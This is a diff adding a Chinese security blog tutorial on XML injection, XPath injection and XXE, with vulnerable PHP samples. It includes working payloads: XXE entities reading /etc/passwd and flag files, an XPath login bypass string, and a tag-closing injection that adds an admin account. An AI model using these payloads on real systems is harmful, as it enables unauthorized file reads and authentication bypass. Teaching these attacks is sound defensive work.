@@ -1,0 +1,288 @@
+---
+title: XML 相关注入
+date: 2024-07-22
+tags:
+  - SEC
+draft: false
+images: ['/static/images/blog/2024/2a972b/Pasted%20image%2020241009100525.png']
+authors: ['default']
+---
+
+- 和LDAP一样，也是类似SQL注入的漏洞，但漏洞出现频率很少
+
+# 基础知识
+
+## XML
+
+XML 指可扩展标记语言（eXtensible Markup Language）
+
+> XML 和 HTML 的不同的目的：
+>
+> XML 被设计用来==传输==和存储数据，其焦点是数据的内容。
+> HTML 被设计用来==显示==数据，其焦点是数据的外观。
+>
+> HTML 旨在显示信息，而 XML 旨在传输信息。
+
+> 为什么需要XML
+>
+> 现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。
+
+```html
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
+<bookstore>
+  <!--根元素-->
+  <book category="COOKING">
+    <!--bookstore的子元素，category为属性-->
+    <title>Everyday Italian</title>
+    <!--book的子元素，lang为属性-->
+    <author>Giada De Laurentiis</author>
+    <!--book的子元素-->
+    <year>2005</year>
+    <!--book的子元素-->
+    <price>30.00</price>
+    <!--book的子元素-->
+  </book>
+  <!--book的结束-->
+</bookstore>
+<!--bookstore的结束-->
+```
+
+---
+
+## DTD
+
+Document Type Definition 是 XML 自己的文档规范。
+
+DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。
+
+DTD 的形式是XML文档中的几条语句，用来说明**哪些元素/属性是合法的以及元素间应当怎样嵌套/结合**，也用来将一些特殊字符和可复用代码段**自定义为实体**。
+
+### 实体引用
+
+举例说明，XML元素以形如 `<tag>foo</tag>` 的标签开始和结束，如果元素内部出现如`<` 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用`&lt; &gt; &amp; &apos; &quot;` 替换 `< > & ' "` 。
+
+实体引用可以起到类似宏定义和**文件包含**的效果，为了方便，我们会希望自定义实体引用，而 DTD 支持这个功能。
+
+> 实体引用是对实体的引用。  
+> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。  
+> 实体可在内部或外部进行声明。
+
+**DTD实体** 有 内部声明实体和外部引用实体两种：
+
+内部：
+
+```html
+<!DOCTYPE 根元素名称 [元素声明]>
+```
+
+外部：
+
+```html
+<!DOCTYPE 根元素名称 SYSTEM/PUBLIC "dtd路径">
+```
+
+而外部实体支持一些**可以被利用**的协议：
+![](/static/images/blog/2024/2a972b/Pasted%20image%2020241009090621.png)
+
+```
+file://文件绝对路径 如：file:///etc/passwd
+http://url/file.txt
+php://filter/read=convert.base64-encode/resource=xxx.php
+```
+
+payload：
+
+```html
+<?xml version = "1.0" encoding = "utf-8"?>
+<!DOCTYPE test [
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+    <!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
+]>
+<author>&file;©right;</author>
+```
+
+DTD实体还有另一种包含参数的形式：
+
+- 参数实体语法：`<!ENTITY % 实体名称 SYSTEM "URI/URL">`
+
+参数实体+外部实体示例代码：
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE test [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  %file;
+]>
+```
+
+`%file`(参数实体)是在DTD中被引用的，而`&file`是在xml文档中被引用的。
+
+# 攻击
+
+## XML 注入
+
+XML与HTML一样，也存在注入攻击，在注入的方法上也非常相似。
+
+XML注入两大要素：**标签闭合和获取XML表结构**
+
+#### 实例
+
+```html
+<?xml version="1.0" encoding="utf-8"?>
+<manager>
+    <admin id="1">
+    <username>admin</username>
+    <password>admin</password>
+</manager>
+```
+
+对于上面的xml文件，如果攻击者能够自定义输入password字段，那么就会产生XML注入。
+
+如攻击者输入：
+
+```
+admin </password></admin><admin id="3"><name>hack</name><password>hacker</password></admin>
+```
+
+最终修改结果为：
+
+```html
+<?xml version="1.0" encoding="utf-8"?>
+<manager>
+  <admin id="1">
+    <name>admin</name>
+    <password>admin</password>
+  </admin>
+  <admin id="3">
+    <name>hack</name>
+    <password>hacker</password>
+  </admin>
+</manager>
+```
+
+这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。
+
+---
+
+## XPath 注入
+
+XPath，即XML路径语言，用于查询的XML数据库。
+
+XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有以下优势：
+
+1. 广泛性  
+   不同数据库支持的SQL语言不同，XML语法只有一种。
+2. 危害性大  
+   XPath语言几乎可以没有访问控制的限制，而在SQL注入中，一个“`用户`”的权限可能被限制到 某一特定的表、列或者查询。  
+   XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。
+
+#### 实例
+
+结构：
+![](/static/images/blog/2024/2a972b/Pasted%20image%2020241009100325.png)
+
+- 本地调试命令：`php -S localhost:8000`
+
+  1.xml
+
+```html
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+  <users>
+    <user>
+      <id>1</id>
+      <username>test1</username>
+      <password>test1</password>
+    </user>
+    <user>
+      <id>2</id>
+      <username>44</username>
+      <password>44</password>
+    </user>
+  </users>
+</root>
+```
+
+1.php
+
+```php
+<?php
+$xml=simplexml_load_file('1.xml');
+$name=$_GET['name'];
+$pwd=$_GET['pwd'];
+$query="/root/users/user[username/text()='".$name."' and password/text()='".$pwd."']";
+echo $query;
+$result=$xml->xpath($query);
+if($result){
+    echo '<h2>Welcome</h2>';
+    foreach($result as $key=>$value){
+        echo '<br />ID:'.$value->id;
+        echo '<br />Username:'.$value->username;
+    }
+}
+?>
+```
+
+注入 `' or 1=1 or ''='` 得到所有用户信息：
+![](/static/images/blog/2024/2a972b/Pasted%20image%2020241009100525.png)
+
+- 盲注：[从XML相关一步一步到XXE漏洞 - 先知社区](https://xz.aliyun.com/t/6887?time__1311=n4%2BxnD0Dg7excGiD%2FAe0%3DDODBDIgpZAn16rQrYD#toc-4)
+
+---
+
+## XML外部实体注入 XXE
+
+- XXE：XML External Entity Injection 即XML外部实体注入
+
+XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成**任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击**等危害。
+
+XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
+
+#### 实例
+
+```php
+<?php
+$xmlfile=file_get_contents('php://input');
+$dom=new DOMDocument();
+$dom->loadXML($xmlfile);
+$xml=simplexml_import_dom($dom);
+$xxe=$xml->xxe;
+$str="$xxe \n";
+echo $str;
+?>
+```
+
+- phpinput 通过 POST 传入数据
+- 实战中可以通过抓包观察有没有 POST 数据，形式是不是 xml
+
+payload（POST）：
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE a [
+<!ENTITY file SYSTEM "file:///44.txt">
+]>
+<xml>
+<xxe>
+&file;</xxe>
+</xml>
+```
+
+```
+<?xml version="1.0" ?>
+<!DOCTYPE feng [
+<!ENTITY file SYSTEM  "file:///flag">
+]>
+<user>
+	<username>&file;</username>
+	<password>1</password>
+</user>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE a [
+<!ENTITY file SYSTEM "file:///flag">
+]>
+<user><username>$file;</username><password>22</password></user>
+```
+
+---
